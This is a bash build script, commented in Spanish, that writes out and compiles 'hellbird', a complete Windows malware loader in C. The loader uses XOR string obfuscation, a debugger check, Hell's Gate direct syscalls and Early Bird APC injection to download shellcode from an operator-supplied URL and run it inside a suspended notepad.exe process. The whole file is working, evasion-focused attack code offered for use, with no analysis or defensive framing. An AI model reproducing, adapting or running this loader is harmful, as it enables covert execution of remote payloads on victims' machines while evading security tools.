#!/bin/bash

# === CONFIGURACIÓN HELLBIRD ===
TARGET=""
URL=""
PROCESS_NAME="C:/Windows/System32/notepad.exe"
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
TIMEOUT=15
MAX_SIZE=2097152
XOR_KEY_HEX="0x33"
XOR_KEY_DEC="51"

# === USO ===
usage() {
    echo "Usage: $0 --target <windows> --url <url> [--key <xor_key>]"
    echo "For windows target, also specify: --process-name <path>"
    exit 1
}

# === PARSING DE ARGUMENTOS ===
while [[ $# -gt 0 ]]; do
    case "$1" in
        --target)
            TARGET="$2"
            shift 2
            ;;
        --url)
            URL="$2"
            shift 2
            ;;
        --key)
            XOR_KEY_HEX="$2"
            XOR_KEY_DEC=$(printf "%d" $XOR_KEY_HEX 2>/dev/null || echo "51")
            if ! [[ "$XOR_KEY_DEC" =~ ^[0-9]+$ ]]; then
                echo "[-] Invalid XOR key after conversion"
                exit 1
            fi
            shift 2
            ;;
        --process-name)
            PROCESS_NAME="$2"
            shift 2
            ;;
        *)
            echo "Opción desconocida: $1"
            usage
            ;;
    esac
done

# Validación inicial
if [[ -z "$TARGET" || -z "$URL" ]]; then
    usage
fi

[[ "$TARGET" != "windows" ]] && { echo "Target must be 'windows'"; exit 1; }

if ! [[ "$XOR_KEY_HEX" =~ ^0x[0-9a-fA-F]+$ ]]; then
    echo "[-] Invalid XOR key format. Use 0xNN"
    exit 1
fi

# === FUNCIÓN: XOR + array C ===
xor_string() {
    local str="$1"
    local key=$2
    local bytes=()
    for (( i=0; i<${#str}; i++ )); do
        local char="${str:$i:1}"
        local val=$(printf '%d' "'$char")
        bytes+=($(( val ^ key )))
    done
    local IFS=", "
    echo "${bytes[*]}"
}

# Generar arrays ofuscados
OBF_URL_BYTES=$(xor_string "$URL" $XOR_KEY_DEC)
OBF_PROC_BYTES=$(xor_string "$PROCESS_NAME" $XOR_KEY_DEC)
OBF_UA_BYTES=$(xor_string "$USER_AGENT" $XOR_KEY_DEC)

# Generar _SEED aleatorio
SEED=$(printf "%08x" $((RANDOM * 32767 + RANDOM)))

# === GENERAR Makefile ===
cat > Makefile << 'EOF'
.PHONY: windows clean
windows: hellbird.c
	x86_64-w64-mingw32-gcc hellbird.c -o hellbird.exe -lws2_32 -s -Os -fno-stack-protector -static
clean:
	rm -f hellbird.exe hellbird.c
EOF

# === GENERAR hellbird.c COMPLETO ===
cat > hellbird.c << EOF
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define XOR_KEY $XOR_KEY_HEX
#define DEBUG
#define TIMEOUT $TIMEOUT
#define MAX_RESPONSE_SIZE $MAX_SIZE

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS 0x00000000L
#endif

// === OFUSCACIÓN DE STRINGS ===
unsigned char OBF_SHELLCODE_URL[] = { $OBF_URL_BYTES, 0 };
unsigned char OBF_TARGET_PROCESS[] = { $OBF_PROC_BYTES, 0 };
unsigned char OBF_USER_AGENT[] = { $OBF_UA_BYTES, 0 };

// === ESTRUCTURAS NECESARIAS (MinGW-safe) ===
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    DWORD Length;
    DWORD Initialized;
    PVOID SsHandle;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

// === PEB WALKER ROBUSTO ===
HMODULE GetNtdllBase() {
    printf("[*] Buscando ntdll.dll...\n");
    fflush(stdout);

    PEB* peb;
#ifdef _WIN64
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r" (peb));
#else
    __asm__ volatile ("movl %%fs:0x30, %0" : "=r" (peb));
#endif

    PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* list = ldr->InMemoryOrderModuleList.Flink;
    LIST_ENTRY* head = list;

    do {
        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)list - 0x10);
        if (entry->BaseDllName.Length == 20 && entry->BaseDllName.Buffer != NULL) {
            if (entry->BaseDllName.Buffer[0] == L'n' &&
                entry->BaseDllName.Buffer[1] == L't' &&
                entry->BaseDllName.Buffer[2] == L'd' &&
                entry->BaseDllName.Buffer[3] == L'l' &&
                entry->BaseDllName.Buffer[4] == L'l' &&
                entry->BaseDllName.Buffer[5] == L'.' &&
                entry->BaseDllName.Buffer[6] == L'd' &&
                entry->BaseDllName.Buffer[7] == L'l' &&
                entry->BaseDllName.Buffer[8] == L'l') {
                printf("[+] ntdll.dll encontrado en: 0x%p\n", entry->DllBase);
                fflush(stdout);
                return (HMODULE)entry->DllBase;
            }
        }
        list = list->Flink;
    } while (list != head);

    // Fallback
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (h) {
        printf("[+] ntdll.dll obtenido con GetModuleHandleA: 0x%p\n", h);
        fflush(stdout);
        return h;
    }

    printf("[-] No se pudo encontrar ntdll.dll\n");
    fflush(stdout);
    return NULL;
}

// === HELL'S GATE ===
static volatile DWORD __syscall_ssn = 0;

DWORD GetSyscallNumber(PVOID func_addr) {
    if (!func_addr) return 0;
    BYTE* addr = (BYTE*)func_addr;
    for (int i = 0; i < 32; i++) {
        if (addr[i] == 0xB8) {
            return *(DWORD*)(addr + i + 1) & 0xFFFF;
        }
        if (addr[i] == 0xC3) break;
    }
    return 0;
}

DWORD HellsGate(DWORD ssn) {
    __syscall_ssn = ssn;
    return ssn;
}

__attribute__((naked))
NTSTATUS HellDescent(
    DWORD64 arg1, DWORD64 arg2, DWORD64 arg3,
    DWORD64 arg4, DWORD64 arg5, DWORD64 arg6
) {
    __asm__ volatile (
        "movq %%rcx, %%r10\n\t"
        "movl __syscall_ssn(%%rip), %%eax\n\t"
        "syscall\n\t"
        "ret\n\t"
        :
        :
        : "rax", "r10", "rcx"
    );
}

// === XOR ===
void xor_string(char* data, size_t len, char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// === WINSOCK ===
int init_winsock() {
    WSADATA wsa;
    return WSAStartup(MAKEWORD(2,2), &wsa) == 0;
}

// === BUFFER DINÁMICO ===
typedef struct {
    char* buffer;
    size_t size;
    size_t capacity;
} Buffer;

int buffer_append(Buffer* b, const char* data, size_t len) {
    if (b->size + len > b->capacity) {
        size_t new_cap = b->capacity ? b->capacity * 2 : 4096;
        while (new_cap < b->size + len) new_cap *= 2;
        char* new_buf = realloc(b->buffer, new_cap);
        if (!new_buf) return 0;
        b->buffer = new_buf;
        b->capacity = new_cap;
    }
    memcpy(b->buffer + b->size, data, len);
    b->size += len;
    return 1;
}

// === EXTRAER SHELLCODE ===
int extract_shellcode(const char* input, size_t len, unsigned char** out) {
    *out = NULL;
    unsigned char* sc = malloc(1024);
    size_t capacity = 1024;
    size_t count = 0;

    for (size_t i = 0; i < len - 3; i++) {
        if (input[i] == '\\\\' && input[i+1] == 'x' && i+3 < len) {
            char hex[3] = { input[i+2], input[i+3], '\\0' };
            char* end;
            long val = strtol(hex, &end, 16);
            if (end == hex + 2 && val >= 0 && val <= 255) {
                if (count >= capacity) {
                    capacity *= 2;
                    unsigned char* tmp = realloc(sc, capacity);
                    if (!tmp) { free(sc); return -1; }
                    sc = tmp;
                }
                sc[count++] = (unsigned char)(val ^ XOR_KEY);
                i += 3;
            }
        }
    }

    if (count == 0) { free(sc); return 0; }
    *out = sc;
    return count;
}

// === ANTI-ANALYSIS ===
BOOL anti_analysis() {
    if (IsDebuggerPresent()) {
        printf("[-] Debugger detectado.\n");
        fflush(stdout);
        return TRUE;
    }
    return FALSE;
}

// === DESCARGA ===
int download_shellcode(unsigned char** shellcode_out) {
    printf("[*] Iniciando descarga de shellcode...\n");
    fflush(stdout);

    if (!init_winsock()) {
        printf("[-] init_winsock falló.\n");
        fflush(stdout);
        return 0;
    }

    const char* proto = strstr((char*)OBF_SHELLCODE_URL, "://");
    if (!proto) {
        printf("[-] URL inválida.\n");
        fflush(stdout);
        return 0;
    }
    proto += 3;

    const char* path = strchr(proto, '/');
    if (!path) path = "/";
    size_t path_len = strlen(path);

    char host[256] = {0};
    int port = 80;
    size_t host_len = path - proto;
    if (host_len >= sizeof(host)) host_len = sizeof(host) - 1;
    strncpy(host, proto, host_len);

    char* colon = strchr(host, ':');
    if (colon) {
        port = atoi(colon + 1);
        *colon = '\\0';
    }

    struct hostent* he = gethostbyname(host);
    if (!he) {
        printf("[-] gethostbyname falló.\n");
        fflush(stdout);
        return 0;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("[-] socket falló.\n");
        fflush(stdout);
        return 0;
    }

    struct sockaddr_in serv_addr = {0};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    serv_addr.sin_addr = *(struct in_addr*)he->h_addr_list[0];

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("[-] connect falló.\n");
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    char request[1024];
    snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\\r\\n"
        "Host: %s:%d\\r\\n"
        "User-Agent: %s\\r\\n"
        "Connection: close\\r\\n"
        "\\r\\n",
        path, host, port, (char*)OBF_USER_AGENT);

    send(sock, request, strlen(request), 0);

    Buffer response = {0};
    char buffer[4096];
    fd_set readfds;
    struct timeval tv;
    int bytes;

    while (1) {
        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);
        tv.tv_sec = TIMEOUT;
        tv.tv_usec = 0;

        int activity = select(0, &readfds, NULL, NULL, &tv);
        if (activity <= 0) break;

        bytes = recv(sock, buffer, sizeof(buffer)-1, 0);
        if (bytes <= 0) break;
        buffer[bytes] = '\\0';
        if (!buffer_append(&response, buffer, bytes)) break;
    }

    closesocket(sock);
    WSACleanup();

    char* body = strstr(response.buffer, "\\r\\n\\r\\n");
    if (!body) {
        printf("[-] No se encontró el cuerpo de la respuesta.\n");
        fflush(stdout);
        free(response.buffer);
        return 0;
    }
    body += 4;

    int sc_len = extract_shellcode(body, response.buffer + response.size - body, shellcode_out);
    free(response.buffer);

    if (sc_len <= 0) {
        printf("[-] No se extrajo shellcode.\n");
        fflush(stdout);
        return 0;
    }

    printf("[+] Shellcode descargado y des-XOR: %d bytes\n", sc_len);
    fflush(stdout);
    return sc_len;
}

// === INYECCIÓN EARLY BIRD ===
BOOL EarlyBirdAPC_Download() {
    if (anti_analysis()) {
        printf("[-] Entorno de análisis detectado. Saliendo.\n");
        fflush(stdout);
        return FALSE;
    }

    xor_string((char*)OBF_SHELLCODE_URL, sizeof(OBF_SHELLCODE_URL)-1, XOR_KEY);
    xor_string((char*)OBF_TARGET_PROCESS, sizeof(OBF_TARGET_PROCESS)-1, XOR_KEY);
    xor_string((char*)OBF_USER_AGENT, sizeof(OBF_USER_AGENT)-1, XOR_KEY);

    unsigned char* shellcode = NULL;
    int shellcode_len = download_shellcode(&shellcode);
    if (shellcode_len <= 0) {
        printf("[-] Fallo en download_shellcode.\n");
        fflush(stdout);
        return FALSE;
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFOA);

    printf("[*] Intentando crear proceso: %s\n", OBF_TARGET_PROCESS);
    fflush(stdout);

    if (!CreateProcessA(
        (char*)OBF_TARGET_PROCESS,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        DWORD err = GetLastError();
        printf("[-] CreateProcessA falló para %s: %lu\n", OBF_TARGET_PROCESS, err);
        fflush(stdout);
        free(shellcode);
        return FALSE;
    }

    printf("[+] Proceso suspendido creado: PID=%lu\n", pi.dwProcessId);
    fflush(stdout);

    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    HMODULE ntdll = GetNtdllBase();
    if (!ntdll) {
        printf("[-] No se pudo obtener ntdll.dll\n");
        fflush(stdout);
        free(shellcode);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    PVOID pNtAllocateVirtualMemory = GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    PVOID pNtWriteVirtualMemory   = GetProcAddress(ntdll, "NtWriteVirtualMemory");
    PVOID pNtQueueApcThread       = GetProcAddress(ntdll, "NtQueueApcThread");
    PVOID pNtResumeThread         = GetProcAddress(ntdll, "NtResumeThread");

    if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtQueueApcThread || !pNtResumeThread) {
        printf("[-] No se pudieron obtener funciones de ntdll\n");
        fflush(stdout);
        free(shellcode);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    DWORD ssn_alloc = GetSyscallNumber(pNtAllocateVirtualMemory);
    DWORD ssn_write = GetSyscallNumber(pNtWriteVirtualMemory);
    DWORD ssn_apc   = GetSyscallNumber(pNtQueueApcThread);
    DWORD ssn_resume = GetSyscallNumber(pNtResumeThread);

    if (!ssn_alloc || !ssn_write || !ssn_apc || !ssn_resume) {
        printf("[-] No se pudo obtener SSN de alguna función\n");
        fflush(stdout);
        free(shellcode);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    SIZE_T size = (shellcode_len + 4095) & ~4095;
    LPVOID pRemoteMem = NULL;
    ULONG oldProtect = 0;

    HellsGate(ssn_alloc);
    NTSTATUS status = HellDescent(
        (DWORD64)hProcess,
        (DWORD64)&pRemoteMem,
        0,
        (DWORD64)&size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (status != STATUS_SUCCESS) {
        printf("[-] NtAllocateVirtualMemory falló: 0x%08lX\n", (unsigned long)status);
        fflush(stdout);
        free(shellcode);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    printf("[+] Memoria remota asignada: 0x%p\n", pRemoteMem);
    fflush(stdout);

    if (!WriteProcessMemory(hProcess, pRemoteMem, shellcode, shellcode_len, NULL)) {
        printf("[-] WriteProcessMemory falló: %lu\n", GetLastError());
        fflush(stdout);
        free(shellcode);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    free(shellcode);
    printf("[+] Shellcode escrito en proceso remoto.\n");
    fflush(stdout);

    // ✅ Usa VirtualProtectEx en lugar de NtProtectVirtualMemory
    if (!VirtualProtectEx(hProcess, pRemoteMem, size, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] VirtualProtectEx falló: %lu\n", GetLastError());
        fflush(stdout);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    printf("[+] Protección cambiada a PAGE_EXECUTE_READ.\n");
    fflush(stdout);

    HellsGate(ssn_apc);
    status = HellDescent(
        (DWORD64)hThread,
        (DWORD64)pRemoteMem,
        0, 0, 0, 0
    );
    if (status != STATUS_SUCCESS) {
        printf("[-] NtQueueApcThread falló: 0x%08lX\n", (unsigned long)status);
        fflush(stdout);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    printf("[+] APC enqueued via NtQueueApcThread.\n");
    fflush(stdout);

    HellsGate(ssn_resume);
    DWORD suspendCount;
    status = HellDescent(
        (DWORD64)hThread,
        (DWORD64)&suspendCount,
        0, 0, 0, 0
    );
    if (status != STATUS_SUCCESS) {
        printf("[-] NtResumeThread falló: 0x%08lX\n", (unsigned long)status);
        fflush(stdout);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    printf("[+] Hilo reanudado. Payload en ejecución.\n");
    fflush(stdout);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

// === MAIN ===
int main() {
    printf("[*] Iniciando beacon con HellsGate + Early Bird + XOR...\n");
    fflush(stdout);

    if (EarlyBirdAPC_Download()) {
        printf("[+] Inyección exitosa.\n");
        fflush(stdout);
        return 0;
    } else {
        printf("[-] Inyección fallida.\n");
        fflush(stdout);
        return 1;
    }
}
EOF

echo "[+] Generated hellbird.c"
make windows
echo "[+] Compiled: hellbird.exe"